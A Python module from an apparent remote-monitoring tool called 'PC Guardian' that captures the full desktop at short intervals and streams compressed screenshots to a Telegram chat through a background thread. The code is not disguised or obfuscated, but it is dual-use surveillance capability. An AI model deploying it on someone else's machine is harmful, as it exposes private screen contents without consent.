"""
PC Guardian — Fast Screenshot Streamer
Sends screenshots every N seconds to Telegram.
Compressed JPEG for speed — 1 second interval possible.
"""

import os
import time
import logging
import threading
import tempfile
import asyncio
from datetime import datetime

logger = logging.getLogger("screen_stream")

SNAP_DIR = os.path.join(tempfile.gettempdir(), "pcguardian_screens")
os.makedirs(SNAP_DIR, exist_ok=True)


class ScreenStreamer:
    def __init__(self):
        self._streaming  = False
        self._bot        = None
        self._chat_id    = None
        self._loop       = None
        self._interval   = 3.0
        self._quality    = 60   # JPEG quality — lower = faster send
        self._thread     = None

    def set_bot(self, bot, loop):
        self._bot  = bot
        self._loop = loop

    def start(self, chat_id: int, interval: float = 3.0, quality: int = 60):
        """
        Start screen stream.
        interval: seconds between screenshots (minimum ~1.0 for fast mode)
        quality: JPEG quality 1-95 (lower = smaller file = faster)
        """
        if self._streaming:
            self.stop()

        self._streaming = True
        self._chat_id   = chat_id
        self._interval  = max(interval, 0.5)  # minimum 0.5s
        self._quality   = quality

        self._thread = threading.Thread(
            target=self._run, daemon=True, name="ScreenStream"
        )
        self._thread.start()
        logger.info(f"Screen stream started — {interval}s interval, quality {quality}")

    def stop(self):
        self._streaming = False
        logger.info("Screen stream stopped.")

    def capture_one(self) -> str:
        """Capture single screenshot. Returns file path."""
        try:
            from PIL import ImageGrab, Image
            img  = ImageGrab.grab()

            # Resize for faster transfer — 50% of original
            w, h = img.size
            img  = img.resize((w // 2, h // 2), Image.LANCZOS)

            path = os.path.join(SNAP_DIR, f"screen_{int(time.time()*1000)}.jpg")
            img.save(path, "JPEG", quality=self._quality, optimize=True)
            return path
        except Exception as e:
            logger.error(f"Screenshot failed: {e}")
            return None

    def _run(self):
        frame_count = 0
        while self._streaming:
            start = time.time()

            path = self.capture_one()
            if path and self._bot and self._chat_id:
                self._send(path)
                frame_count += 1

            # Precise timing
            elapsed = time.time() - start
            sleep   = max(0, self._interval - elapsed)
            time.sleep(sleep)

        logger.info(f"Screen stream ended after {frame_count} frames.")

    def _send(self, path: str):
        """Send screenshot to Telegram from background thread."""
        if not self._loop or not self._loop.is_running():
            return
        try:
            async def _do():
                try:
                    with open(path, "rb") as f:
                        await self._bot.send_photo(
                            chat_id=self._chat_id,
                            photo=f,
                        )
                    # Clean up old files
                    try: os.remove(path)
                    except Exception: pass
                except Exception as e:
                    logger.error(f"Screen send: {e}")

            asyncio.run_coroutine_threadsafe(_do(), self._loop)
        except Exception as e:
            logger.error(f"Threadsafe screen send: {e}")


# Global instance
_streamer = ScreenStreamer()


def get_streamer() -> ScreenStreamer:
    return _streamer
